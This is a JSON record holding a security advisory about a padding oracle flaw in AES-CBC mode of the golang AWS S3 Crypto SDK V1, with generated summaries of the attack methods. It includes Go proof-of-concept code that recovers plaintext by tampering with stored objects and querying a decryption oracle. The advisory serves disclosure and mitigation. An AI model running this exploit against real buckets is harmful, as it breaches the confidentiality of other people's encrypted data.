{"description": "### Summary\n\nThe golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the CBC option was chosen as content cipher.\n\n### Risk/Severity\n\nThe vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.\n\n### Impact\n\nThis advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non \"strict\" versions of C++ and Java S3 Crypto SDKs being present as well.\n\nV1 prior to 1.34.0 of the S3 crypto SDK, allows users to encrypt files with AES-CBC, without computing a MAC on the data. Note that there is an alternative option of using AES-GCM, which is used in the examples of the documentation and not affected by this vulnerability, but by CVE-2020-8912.\n\nThis exposes a padding oracle vulnerability: If the attacker has write access to the S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file (without observing the file contents that the endpoint learns in the process), they can reconstruct the plaintext with (on average) `128*length(plaintext)` queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors.\n\nThis issue is fixed in V2 of the API, by disabling encryption with CBC mode for new files. Old files, if they have been encrypted with CBC mode, remain vulnerable until they are reencrypted with AES-GCM.\n\n### Mitigation\n\nUsing the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with CBC mode.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.\n\nThis particular issue is described in [padding_oracle_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/padding_oracle_exploit.go):\n\n```golang\nfunc PaddingOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {\n\tdata, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tif alg := header.Get(\"X-Amz-Meta-X-Amz-Cek-Alg\"); alg != \"AES/CBC/PKCS5Padding\" {\n\t\treturn \"\", fmt.Errorf(\"Algorithm is %q, not CBC!\", alg)\n\t}\n\tlength, err := strconv.Atoi(header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\"))\n\tpadding := byte(len(data) - length)\n\tplaintext := make([]byte, length)\n\tfor i := length - 1; i >= 0; i-- {\n\t\tnewLength := 16 * (i/16 + 1)\n\t\tdataCopy := make([]byte, newLength)\n\t\theaderCopy := header.Clone()\n\t\tcopy(dataCopy, data)\n\t\t// Set Padding\n\t\tnewPadding := byte(newLength - i)\n\t\tfor j := i + 1; j < newLength; j++ {\n\t\t\tvar oldValue byte\n\t\t\tif j >= length {\n\t\t\t\toldValue = padding\n\t\t\t} else {\n\t\t\t\toldValue = plaintext[j]\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(oldValue^newPadding, j, dataCopy, headerCopy)\n\t\t\tif err != nil {\n\t\t\t\treturn \"\", err\n\t\t\t}\n\t\t}\n\t\t// Guess\n\t\tfor c := 0; c < 256; c++ {\n\t\t\tdataCopy, headerCopy, err := xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", dataCopy, headerCopy)\n\t\t\tif input.Oracle(bucket, key+\"guess\") {\n\t\t\t\tplaintext[i] = byte(c)\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t}\n\t}\n\treturn string(plaintext), nil\n}\n```", "methods": ["Used a padding oracle vulnerability to decrypt files in an S3 bucket.", "Exploited the CBC mode of AES encryption to manipulate the bytes of the next block and PKCS5 padding errors.", "Used the ability of CBC to manipulate the bytes of the next block to reconstruct the plaintext.", "Exploited the lack of MAC computation on the data when encrypting with AES-CBC.", "Used the X-Amz-Meta-X-Amz-Cek-Alg header to determine the encryption algorithm used.", "Used the X-Amz-Meta-X-Amz-Unencrypted-Content-Length header to determine the length of the plaintext.", "Used the S3 API to read and write files in the bucket.", "Used the S3 API to mock the behavior of the S3 service for testing purposes.", "Used the `xorData` function to manipulate the data and headers of the S3 objects.", "Used a brute-force approach to guess the plaintext by trying all possible values of a byte."]}